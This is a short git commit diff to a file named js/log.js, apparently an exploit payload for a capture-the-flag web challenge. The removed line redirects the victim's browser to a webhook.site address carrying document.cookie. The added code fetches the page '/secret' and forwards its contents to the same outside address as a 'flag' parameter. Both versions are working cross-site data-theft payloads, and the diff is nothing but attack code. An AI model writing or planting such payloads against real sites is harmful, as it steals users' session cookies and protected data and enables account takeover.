e1cf8be57f9949deb984f80d8ca111616e6da9df
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-16 19:59:45 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,1 +1,8 @@
-window.location="https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+document.cookie;
+fetch("/secret")
+  .then(data => data.text())
+  .then(flag => {
+    window.location = "https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag=" + flag;
+  })
+  .catch(error => {
+    console.error('There was a problem:', error);
+  });
